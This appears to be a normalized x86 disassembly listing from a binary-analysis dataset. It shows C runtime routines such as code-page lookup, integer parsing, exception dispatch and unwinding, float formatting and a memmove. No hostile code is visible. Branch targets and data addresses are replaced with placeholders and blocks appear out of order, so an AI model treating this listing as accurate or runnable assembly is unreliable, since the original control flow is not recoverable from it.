mov [ esi + eax + 0x11d ] bl
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_41450f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_407759
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_41458b
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
test eax eax
je r-xdata
test edi edi
jne r-xdata
mov [ eax ] edi
cmp [ ebp + 0x10 ] 0x0
je r-xdata
call sub_40f84f
mov [ eax ] 0x16
call sub_40c515
xor eax eax
jmp r-xdata
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push 0x8
pop ebx
cmp [ ebp + 0x10 ] 0x2
jl r-xdata
pop edi
leave
retn
movzx esi [ edi ]
push ebx
push esi
add edi 0x2
call sub_4061d8
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp si 0x2d
jne r-xdata
cmp [ ebp + 0x10 ] 0x24
jg r-xdata
cmp si 0x2b
jne r-xdata
or [ ebp + 0x14 ] 0x2
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
movzx esi [ edi ]
add edi 0x2
cmp [ ebp + 0x10 ] 0x10
jne r-xdata
push esi
call sub_40d28e
pop ecx
test eax eax
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edx
mov ebx eax
push esi
call sub_40d28e
pop ecx
test eax eax
jne r-xdata
movzx eax [ edi ]
cmp eax 0x78
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
cmp eax [ ebp + 0x10 ]
jae r-xdata
push 0x41
pop eax
cmp ax si
ja r-xdata
movzx eax [ edi ]
cmp eax 0x78
je r-xdata
mov [ ebp + 0x10 ] 0x10
cmp eax 0x58
je r-xdata
mov eax [ ebp + 0x14 ]
sub edi 0x2
test al 0x8
jne r-xdata
or [ ebp + 0x14 ] 0x8
cmp [ ebp - 0x4 ] ebx
jb r-xdata
lea eax [ esi - 0x61 ]
cmp ax 0x19
ja r-xdata
cmp si 0x5a
jbe r-xdata
movzx esi [ edi + 0x2 ]
add edi 0x4
cmp eax 0x58
jne r-xdata
mov [ ebp + 0x10 ] ebx
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
imul ecx [ ebp + 0x10 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
jne r-xdata
lea eax [ esi - 0x61 ]
cmp ax 0x19
movzx eax si
ja r-xdata
call sub_40f84f
test [ ebp + 0x14 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0x8 ]
push esi
call sub_40d28e
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp + 0x14 ] 0x4
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp eax [ ebp - 0x8 ]
jbe r-xdata
add eax 0xffffffc9
sub eax 0x20
test [ ebp + 0x14 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0xc ]
pop esi
pop ebx
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx esi [ edi ]
add edi 0x2
jmp r-xdata
test [ ebp + 0x14 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov eax [ ebp - 0x4 ]
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
sub_414750
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_4147e0
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_415c05
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_415c24
jmp r-xdata
sub_4147e0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_401400
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_414750
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_414842
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_414872
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4148b0
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_4148db
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp ecx 0x19930521
je r-xdata
call sub_40c968
xor ecx ecx
inc ecx
mov [ eax + 0x20c ] ecx
mov eax ecx
retn
cmp ecx 0x19930522
jne r-xdata
sub_414920
mov edi edi
push ebp
mov ebp esp
xor eax eax
sub esp 0xc
cmp edi eax
jne r-xdata
mov [ ebp - 0x1 ] al
mov [ ebp - 0xc ] eax
cmp [ edi ] eax
jle r-xdata
call sub_40ffac
mov al [ ebp - 0x1 ]
leave
retn
push ebx
mov [ ebp - 0x8 ] eax
push esi
test ebx ebx
jg r-xdata
mov ecx [ ebp + 0x8 ]
push [ ecx + 0x1c ]
mov eax [ esi ]
push eax
mov eax [ edi + 0x4 ]
add eax [ ebp - 0x8 ]
push eax
call sub_40c88b
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
mov [ ebp - 0x1 ] 0x1
dec ebx
add esi 0x4
inc [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] 0x10
cmp eax [ edi ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
mov ebx [ eax ]
lea esi [ eax + 0x4 ]
jmp r-xdata
pop esi
pop ebx
sub_4149df
push 0x2c
push r--data
call sub_413ff0
mov ebx ecx
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1c ] ebx
and [ ebp - 0x34 ] 0x0
mov eax [ edi - 0x4 ]
mov [ ebp - 0x24 ] eax
push [ esi + 0x18 ]
lea eax [ ebp - 0x3c ]
push eax
call sub_407213
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
call sub_40c968
mov eax [ eax + 0x88 ]
mov [ ebp - 0x2c ] eax
call sub_40c968
mov eax [ eax + 0x8c ]
mov [ ebp - 0x30 ] eax
call sub_40c968
mov [ eax + 0x88 ] esi
call sub_40c968
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp + 0x14 ]
push edi
call sub_40b07c
add esp 0x14
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_414b05
mov eax [ ebp - 0x1c ]
call sub_414035
retn
sub_414a78
mov esp [ ebp - 0x18 ]
call sub_40c968
and [ eax + 0x20c ] 0x0
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ esi + 0x4 ] 0x80
jg r-xdata
mov ecx [ edi + 0x8 ]
movsx ecx [ edi + 0x8 ]
jmp r-xdata
push ecx
push esi
push 0x0
push edi
call sub_4023bf
add esp 0x10
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_414b05
mov eax [ ebp - 0x1c ]
call sub_414035
retn
imul eax eax 0x14
mov edx [ eax + ebx + 0x4 ]
cmp ecx edx
jle r-xdata
mov ebx [ esi + 0x10 ]
and [ ebp - 0x20 ] 0x0
inc [ ebp - 0x20 ]
jmp r-xdata
cmp ecx [ eax + ebx + 0x8 ]
jg r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ esi + 0xc ]
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + edx * 8 + 0x8 ]
sub_414b05
mov eax [ ebp - 0x24 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x28 ]
call sub_401c9a
pop ecx
call sub_40c968
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x88 ] ecx
call sub_40c968
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x8c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x19930520
je r-xdata
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_411785
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_408c39
pop ecx
pop ecx
sub_414b7b
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x20 ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x18 ]
push ebx
push esi
push [ ebp + 0x8 ]
call sub_401f65
add esp 0x10
push [ ebp + 0x20 ]
push esi
jmp r-xdata
pop ebp
retn
push esi
push eax
call sub_402824
call sub_405547
push [ edi ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
call sub_4023bf
mov eax [ edi + 0x4 ]
push 0x100
push [ ebp + 0x1c ]
inc eax
push [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
push [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_4149df
add esp 0x28
test eax eax
je r-xdata
sub_414be9
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x80000003
je r-xdata
pop esi
leave
retn
push edi
call sub_40c968
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jne r-xdata
call sub_40c968
lea edi [ eax + 0x80 ]
call sub_401c91
cmp [ edi ] eax
je r-xdata
mov esi [ ebp + 0x1c ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push [ ebp + 0x20 ]
push edi
call sub_40e844
mov ecx [ ebp - 0x4 ]
add esp 0x14
cmp ecx [ ebp - 0xc ]
jae r-xdata
call sub_40ffac
mov eax [ esi ]
cmp eax 0xe0434f4d
je r-xdata
pop edi
add eax 0xc
mov [ ebp - 0x8 ] eax
push ebx
cmp eax 0xe0434352
je r-xdata
inc [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
add eax 0x14
mov [ ebp - 0x8 ] eax
cmp ecx [ ebp - 0xc ]
jb r-xdata
cmp esi [ eax - 0x8 ]
jg r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_40f862
add esp 0x1c
test eax eax
jne r-xdata
lea edi [ eax - 0xc ]
cmp esi [ edi ]
jl r-xdata
pop ebx
mov ecx [ eax ]
shl ecx 0x4
add ecx [ eax + 0x4 ]
mov edx [ ecx - 0xc ]
test edx edx
je r-xdata
lea ebx [ ecx - 0x10 ]
test [ ebx ] 0x40
jne r-xdata
cmp [ edx + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov esi [ ebp + 0xc ]
push [ ebp + 0x20 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_414b7b
mov esi [ ebp + 0x1c ]
mov eax [ ebp - 0x8 ]
add esp 0x1c
sub_414cf0
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x18 ]
mov eax [ ebx + 0x4 ]
push esi
push edi
mov [ ebp - 0x1 ] 0x0
cmp eax 0x80
jg r-xdata
mov ecx [ ecx + 0x8 ]
movsx ecx [ ecx + 0x8 ]
jmp r-xdata
call sub_40ffac
cmp ecx eax
jl r-xdata
mov [ ebp - 0x8 ] ecx
cmp ecx 0xffffffff
jl r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
cmp [ esi ] edi
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
mov ebx 0x19930520
jne r-xdata
call sub_40c968
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi ] edi
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_40ffac
call sub_407805
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_414be9
add esp 0x20
mov ebx [ ebp + 0x18 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
call sub_40c968
cmp [ eax + 0x88 ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp eax 0x19930521
je r-xdata
call sub_40c968
mov esi [ eax + 0x88 ]
mov [ ebp + 0x8 ] esi
call sub_40c968
mov eax [ eax + 0x8c ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
call sub_405707
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_40e844
mov ecx [ ebp - 0x10 ]
add esp 0x14
cmp ecx [ ebp - 0x20 ]
jae r-xdata
cmp eax 0x19930522
jne r-xdata
cmp [ esi ] edi
jne r-xdata
call sub_40ffac
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_408c39
pop ecx
pop ecx
lea edi [ eax + 0x10 ]
mov [ ebp - 0x1c ] edi
call sub_40c968
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
add edi 0x14
mov [ ebp - 0x1c ] edi
cmp eax [ ebp - 0x20 ]
jb r-xdata
cmp ecx [ edi - 0xc ]
jg r-xdata
call sub_40c968
mov edi [ eax + 0x94 ]
call sub_40c968
push [ ebp + 0x8 ]
xor esi esi
mov [ eax + 0x94 ] esi
call sub_414920
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
mov edi [ edi + 0x1c ]
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
lea eax [ edi - 0x10 ]
mov [ ebp - 0x28 ] eax
cmp [ eax ] ecx
jg r-xdata
mov edi [ ebp + 0x18 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x18 ] eax
test eax eax
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
xor ebx ebx
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
push esi
call sub_414920
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea ebx [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
test eax eax
jle r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ ebx + eax + 0x4 ]
push rw-data
call sub_40abb0
test al al
jne r-xdata
call sub_40ffac
cmp eax 0x19930522
jne r-xdata
call sub_40c968
call sub_40c968
call sub_40c968
mov [ eax + 0x88 ] esi
call sub_40c968
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
push esi
jne r-xdata
dec [ ebp - 0x18 ]
add [ ebp - 0xc ] 0x10
cmp [ ebp - 0x18 ] 0x0
jg r-xdata
push [ esi + 0x1c ]
mov eax [ ebx ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
call sub_40c88b
add esp 0xc
test eax eax
jne r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_408c39
pop ecx
pop ecx
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x34 ]
mov [ ebp + 0x8 ] r--data
call sub_40140f
push r--data
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x34 ] r--data
call sub_4037cf
inc esi
add ebx 0x10
cmp esi [ edi ]
jl r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
jmp r-xdata
push [ ebp + 0x24 ]
mov edi [ ebp - 0x28 ]
push [ ebp + 0x20 ]
mov ebx [ ebp - 0xc ]
push [ ebp - 0x24 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
call sub_414b7b
mov esi [ ebp + 0x8 ]
mov edi [ ebp - 0x1c ]
add esp 0x1c
dec [ ebp - 0x14 ]
add ebx 0x4
cmp [ ebp - 0x14 ] eax
jg r-xdata
call sub_405547
mov esi [ ebp + 0x18 ]
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_4023bf
add esp 0x10
push [ esi + 0x1c ]
call sub_414996
sub_415070
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_415bfc
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_415bfc
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_4150bc
mov edi edi
push esi
mov esi eax
test edi edi
je r-xdata
pop esi
retn
push esi
call sub_413e90
inc eax
push eax
push esi
add esi edi
push esi
call sub_4138f0
add esp 0x10
sub_4150db
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_407759
xor ecx ecx
cmp ebx ecx
jne r-xdata
cmp [ ebp + 0x8 ] ecx
jbe r-xdata
call sub_40f84f
push 0x16
cmp [ ebp + 0xc ] ecx
jle r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
mov eax [ ebp + 0xc ]
jmp r-xdata
push edi
cmp [ ebp + 0x18 ] cl
je r-xdata
call sub_40f84f
push 0x22
jmp r-xdata
add eax 0x9
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov edi [ ebp + 0x14 ]
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
mov edx [ ebp + 0x14 ]
xor eax eax
cmp [ ebp + 0xc ] ecx
setg al
xor ecx ecx
cmp [ edx ] 0x2d
sete cl
mov edi eax
add ecx ebx
mov eax ecx
call sub_4150bc
pop esi
mov [ eax ] esi
call sub_40c515
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ ebp + 0x18 ] al
sete al
add eax [ ebp + 0xc ]
add esi eax
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
mov cl [ esi + 0x1 ]
mov eax [ ebp - 0x10 ]
mov [ esi ] cl
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
inc esi
mov [ esi ] al
sub ebx esi
add ebx [ ebp + 0x8 ]
or ebx 0xffffffff
jmp r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_402acd
int3
lea ecx [ esi + 0x2 ]
cmp [ ebp + 0x10 ] eax
je r-xdata
push r--data
push ebx
push esi
call sub_40ca53
add esp 0xc
test eax eax
jne r-xdata
mov eax [ edi + 0xc ]
cmp [ eax ] 0x30
je r-xdata
mov [ esi ] 0x45
test [ rw-data ] 0x1
pop edi
je r-xdata
mov eax [ edi + 0x4 ]
dec eax
jns r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ecx ] 0x30
jne r-xdata
cmp eax 0x64
jl r-xdata
neg eax
mov [ esi + 0x1 ] 0x2d
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x3
lea eax [ ecx + 0x1 ]
push eax
push ecx
call sub_4138f0
add esp 0xc
cmp eax 0xa
jl r-xdata
cdq
push 0x64
pop edi
idiv edi
add [ esi + 0x2 ] al
mov eax edx
pop esi
pop ebx
leave
retn
add [ esi + 0x4 ] al
cdq
push 0xa
pop edi
idiv edi
add [ esi + 0x3 ] al
mov eax edx
sub_41523c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x14 ]
mov edi eax
mov esi [ edi + 0x4 ]
mov ebx ecx
lea ecx [ ebp - 0x10 ]
dec esi
call sub_407759
test ebx ebx
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
call sub_40f84f
push 0x16
pop esi
mov [ eax ] esi
call sub_40c515
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ edi + 0x4 ]
test eax eax
jg r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ edi ] 0x2d
sete al
add eax esi
mov [ eax + ebx ] 0x30
add esi eax
push esi
lea ebx [ esi + 0x1 ]
call sub_413e90
inc eax
push eax
push esi
push ebx
call sub_4138f0
mov [ esi ] 0x30
add esp 0x10
mov esi ebx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push esi
lea ebx [ esi + 0x1 ]
call sub_413e90
inc eax
push eax
push esi
push ebx
call sub_4138f0
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
mov edi [ edi + 0x4 ]
add esp 0x10
test edi edi
jns r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
neg edi
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp + 0xc ] edi
cmp [ ebp + 0xc ] edi
jl r-xdata
mov edi [ ebp + 0xc ]
mov eax ebx
call sub_4150bc
push edi
push 0x30
push ebx
call sub_413e10
add esp 0xc
sub_415340
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_4153c4 ]
jmp [ ecx * 4 + jump_table_415444 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4154b0 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_41564c ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_415550 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_41564c ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4154b0 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
